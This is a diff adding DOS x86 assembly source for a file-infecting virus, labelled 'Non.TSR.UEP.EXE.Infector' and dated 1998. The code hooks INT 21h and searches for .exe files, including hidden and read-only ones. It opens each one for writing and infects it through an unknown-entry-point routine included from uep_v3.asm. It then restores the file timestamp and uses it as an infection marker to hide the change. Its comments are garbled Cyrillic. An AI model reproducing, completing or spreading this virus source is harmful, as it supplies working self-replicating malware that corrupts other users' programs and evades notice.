@@ -1,0 +1,168 @@
+;Non.TSR.UEP.EXE.Infector - BETA TESTER of Unknown Entry Point
+
+VrID		=	'DU'
+VirEntryPoint	=	0000h
+VirPlace	=	0000h
+
+		model	small
+		.486
+UEPtest 	segment para public use16 'code'
+		assume	cs:UEPtest,ds:UEPtest,ss:UEPstack
+		org	0000h
+		pop	dword ptr cs:[ReturnAddres]
+Entry:
+		pushad
+		pushfd
+		push	ds
+		push	es
+		push	fs
+		push	gs
+
+		call	Realloc
+
+		xor	ax,ax	       ;ä†™ °Î Ø•‡•Â¢†‚ ¢•™‚Æ‡Æ¢
+		mov	ds,ax
+		les	bx,ds:[21h*4]
+		mov	word ptr cs:[int21h],bx
+		mov	word ptr cs:[int21h+2],es
+
+		push	cs
+		pop	ds
+
+		mov	ah,62h
+		int	21h
+
+		les	di,dword ptr [ReturnAddres]
+
+		mov	eax,[OldReloc]
+		mov	es:[di-4],ax
+		ror	eax,16
+		add	ax,bx
+		add	ax,10h
+		mov	es:[di-2],ax
+		sub	di,5
+@@temp:
+		mov	es,bx
+		xor	di,di
+
+		mov	word ptr [Jump],di
+		mov	word ptr [Jump+2],es
+
+		mov	dword ptr [@@temp],90909090h
+
+		MOV	AH,1AH			;ìëíÄçéÇàãà çéÇõâ DTA
+		MOV	DX,OFFSET NEW_DTA
+		INT	21H
+
+		MOV	CX,23H		;ëäêõíõâ , ÄêïàÇçõâ , READ ONLY
+		MOV	AH,4EH
+		MOV	DX,OFFSET exe_MASK
+		INT	21H
+		JC	exit@
+CONTINUE:
+		MOV	AX,3D02H
+		MOV	DX,OFFSET NEW_DTA+1EH	;ÄÑêÖë àåÖçà îÄâãÄ Ç DTA
+		INT	21H
+		JC	F_NEXT
+
+		MOV	BX,AX
+		MOV	[HANDLE],AX
+
+		MOV	AX,5700H	;èéãìóàå ÑÄíì
+		INT	21H
+		JC	FIND_NEXT
+
+		cmp	cl,0ffh
+		je	Find_Next
+
+		call	UEPinfect	;ÇÎßÆ¢ Unknown Entry Point
+		jc	Find_Next
+
+		or	al,0ffh
+		mov	cx,ax
+		ror	eax,16
+		mov	dx,ax
+
+		MOV	AX,5701H	 ;ìëíÄçéÇàå ëíÄêéÖ ÇêÖåü
+		INT	21H
+
+		MOV	AH,3EH
+		INT	21H
+exit@:
+		mov	ah,62h
+		int	21h
+
+		mov	ds,bx
+		MOV	AH,1AH		;ÇÖêçÖå DTA çÄ åÖëíé
+		MOV	DX,80H
+		INT	21H
+
+		pop	gs
+		pop	fs
+		pop	es
+		pop	ds
+		popfd
+		popad
+		db	0EAh
+Jump		dd	0
+
+FIND_NEXT:
+		MOV	BX,[HANDLE]
+		MOV	AH,3EH
+		INT	21H
+F_NEXT:
+		MOV	AH,4FH
+		MOV	DX,OFFSET NEW_DTA
+		MOV	CX,23H
+		INT	21H
+		JC	exit@
+		JMP	CONTINUE
+
+Include 	uep_v3.asm
+
+DOS		proc	near
+		pushf
+		db	9Ah	  ;call far ptr int21h
+int21h		dd	0
+		ret
+DOS		endp
+
+Realloc 	proc
+		mov	ah,62h
+		int	21h
+
+		mov	es,bx
+		dec	bx
+		mov	ds,bx
+
+		cmp	byte ptr ds:[0],'Z'
+		jne	@notRealloc
+
+		mov	ax,word ptr ds:[0003]
+		sub	ax,1010h
+		mov	bx,ax
+
+		mov	ah,4Ah
+		int	21h
+@notRealloc:
+		ret
+Realloc 	endp
+
+;-------------- DATA AREA -------------
+ReturnAddres	dw	1000h,SEG UEPtest
+lendecryptor	dw	0
+handle		dw	0
+New_Dta 	db	30h dup (0ffh)
+Path		equ	offset new_dta+1Eh
+exe_MASK	db	'*.exe',0
+DUMB		db	'<DUMB.UEP.Beta.Tester>',0
+Author		db	'UEP written by ë•‡Ü (C) 1998,NSTU,Nsk',0
+Header		db	1Ah dup (0ffh)
+
+VirLen		equ	offset $
+UEPtest 	ends
+
+UEPstack	segment para stack 'stack'
+		db	100h dup(?)
+UEPstack	ends
+		end	Entry
